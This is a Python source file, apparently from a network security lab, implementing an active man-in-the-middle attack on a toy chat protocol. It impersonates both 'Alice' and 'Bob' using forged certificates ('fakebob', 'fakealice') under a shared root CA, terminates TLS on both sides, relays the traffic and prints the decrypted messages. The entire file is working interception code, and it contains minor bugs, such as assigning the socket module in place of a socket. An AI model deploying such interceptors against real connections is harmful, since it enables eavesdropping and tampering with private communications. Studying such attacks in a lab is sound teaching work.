import select, socket, ssl, queue as Queue
import chat_utils as chat_utils
from colorama import Fore, Style

class Active_MITM:
    def __init__(self, self_ip, server_ip, client_ip):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self_ip, 8000))
        self.server.listen(5)

        connection, client_address = self.server.accept()
        self.client_handshake(connection)

        new_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        new_socket.connect((server_ip, 8000))
        self.server_handshake(new_socket)

        print(Fore.CYAN + Style.BRIGHT + "Intercepting messages...\n")
        self.server.setblocking(0)
        self.server_side.setblocking(0)

        self.start_mitm()

    def start_mitm(self):
        self.inputs = [self.client_side, self.server_side]
        self.outputs = []
        self.message_queues = {}
        self.message_queues[self.client_side] = Queue.Queue()
        self.message_queues[self.server_side] = Queue.Queue()
        self.fragment_lists = {}
        self.fragment_lists[self.client_side] = []
        self.fragment_lists[self.server_side] = []
        self.received_message_numbers = {}
        self.received_message_numbers[self.client_side] = 0
        self.received_message_numbers[self.server_side] = 0
        self.lastline_type = self.client_side
        while len(self.inputs) > 1:
            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs)
            for s in readable:
                try:
                    incoming_msg = s.recv(4096).decode('UTF-8')
                    if s is self.client_side:
                        self.message_queues[self.server_side].put(incoming_msg)
                        if self.server_side not in self.outputs:
                            self.outputs.append(self.server_side)
                        if chat_utils.CHAT_MESSAGE in incoming_msg:
                            self.handle_new_message(s, incoming_msg)
                    else:
                        self.message_queues[self.client_side].put(incoming_msg)
                        if self.client_side not in self.outputs:
                            self.outputs.append(self.client_side)
                        if chat_utils.CHAT_MESSAGE in incoming_msg:
                            self.handle_new_message(s, incoming_msg)
                except ssl.SSLWantReadError:
                    pass
            for s in writable:
                try:
                    next_msg = self.message_queues[s].get_nowait()
                except Queue.Empty:
                    self.outputs.remove(s)
                else:
                    if next_msg == chat_utils.CHAT_CLOSE:
                        person = 'Bob'
                        if s is self.server_side:
                            person = 'Alice'
                        print(Fore.RED + Style.BRIGHT + '\n' + person +' closed the connection!', Style.RESET_ALL+'\n')
                        s.send(next_msg.encode('UTF-8'))
                        self.close_connection(s)
                        break
                    else:
                        s.send(next_msg.encode('UTF-8'))
            for s in exceptional:
                self.close_connection(s)

    def handle_new_message(self, s, data):
        msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
        if self.received_message_numbers[s] != msg_num:
            self.received_message_numbers[s] = msg_num
            if num_fragments == 1:
                self.print_message(s, data[28:])
            else:
                self.fragment_lists[s].append(data)
        else:
            if num_fragments == fragment_num:
                self.fragment_lists[s].append(data)
                received_msg = chat_utils.parse(self.fragment_lists[s])
                self.print_message(s, received_msg)
                self.fragment_lists[s].clear()
            else:
                self.fragment_lists[s].append(data)

    def print_message(self, s, message):
        if self.lastline_type != s:
            print("")
            self.lastline_type = s
        if s is self.client_side:
            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
        else:
            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
    
    def close_connection(self, s):
        if s in self.outputs:
            self.outputs.remove(s)
        self.inputs.remove(s)
        s.close()
        del self.message_queues[s]
        del self.received_message_numbers[s]
        del self.fragment_lists[s]

    def client_handshake(self, connection):
        incoming_msg = connection.recv(4096).decode('UTF-8')
        if incoming_msg == chat_utils.CHAT_HELLO:
            response_msg = chat_utils.CHAT_REPLY
            connection.sendall(response_msg.encode('UTF-8'))
            incoming_msg = connection.recv(4096).decode('UTF-8')
            if incoming_msg == chat_utils.CHAT_STARTTLS:
                response_msg = chat_utils.CHAT_STARTTLS_ACK
                connection.sendall(response_msg.encode('UTF-8'))
                secureClientSocket = ssl.wrap_socket(connection, 
                        server_side=True, 
                        ca_certs="./rootCA.crt", 
                        certfile="./fakebob.crt",
                        keyfile="./fakebob.key", 
                        cert_reqs=ssl.CERT_REQUIRED,
                        ssl_version=ssl.PROTOCOL_TLS)
                clientCert = secureClientSocket.getpeercert(binary_form=True)
                if chat_utils.cert_checker(clientCert, ['./rootCA.crt']):
                    incoming_msg = secureClientSocket.recv(4096).decode('UTF-8')
                    if incoming_msg == chat_utils.CHAT_HANDSHAKE_COMPLETED:
                        self.client_side = secureClientSocket
                        return chat_utils.HANDSHAKE_SUCESS_TLS
                    else:
                        response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
                        connection.sendall(response_msg.encode('UTF-8'))
                        secureClientSocket.close()
                        connection.close()
                else:
                    response_msg = chat_utils.CHAT_INVALID_CERTIFICATE
                    connection.sendall(response_msg.encode('UTF-8'))
                    secureClientSocket.close()
                    connection.close()
            elif incoming_msg == chat_utils.CHAT_HANDSHAKE_COMPLETED:
                self.client_side = connection 
                return chat_utils.HANDSHAKE_SUCESS_NO_TLS
            else:
                response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
                connection.sendall(response_msg.encode('UTF-8'))
                connection.close()
        else:
            response_msg = chat_utils.CHAT_INVALID_HANDSHAKE
            connection.sendall(response_msg.encode('UTF-8'))
            connection.close()
        return chat_utils.HANDSHAKE_FAILED

    def server_handshake(self, new_socket):
        input_str = chat_utils.CHAT_HELLO
        new_socket.sendall(input_str.encode('UTF-8'))
        resp = new_socket.recv(4096).decode('UTF-8')
        if resp == chat_utils.CHAT_REPLY:
            input_str = chat_utils.CHAT_STARTTLS
            new_socket.sendall(input_str.encode('UTF-8'))
            resp = new_socket.recv(4096).decode('UTF-8')
            if resp == chat_utils.CHAT_STARTTLS_ACK:
                context = self.get_server_side_TLS_context()
                secureSocket = context.wrap_socket(new_socket)
                serverCert = secureSocket.getpeercert(binary_form=True)
                if chat_utils.cert_checker(serverCert, ['./rootCA.crt']):
                    self.server_side = secureSocket
                    input_str = chat_utils.CHAT_HANDSHAKE_COMPLETED
                    secureSocket.sendall(input_str.encode('UTF-8'))
                    return chat_utils.HANDSHAKE_SUCESS_TLS
                else:
                    input_str = chat_utils.CHAT_INVALID_CERTIFICATE
                    new_socket.sendall(input_str.encode('UTF-8'))
                    secureSocket.close()
                    new_socket.close()
            elif resp == chat_utils.CHAT_STARTTLS_NOT_SUPPORTED:
                self.server_side = socket
                input_str = chat_utils.CHAT_HANDSHAKE_COMPLETED
                new_socket.sendall(input_str.encode('UTF-8'))
                return chat_utils.HANDSHAKE_SUCESS_NO_TLS
            else:
                input_str = chat_utils.CHAT_INVALID_HANDSHAKE
                new_socket.sendall(input_str.encode('UTF-8'))
                new_socket.close()
        else:
            input_str = chat_utils.CHAT_INVALID_HANDSHAKE
            new_socket.sendall(input_str.encode('UTF-8'))
            new_socket.close()
        return chat_utils.HANDSHAKE_FAILED

    def get_server_side_TLS_context(self):
        # creates a SSL context with all the necessary information
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations("./rootCA.crt")
        context.load_cert_chain(certfile="./fakealice.crt", keyfile="./fakealice.key")
        context.options = ssl.OP_NO_TLSv1_2 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1 | ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        return context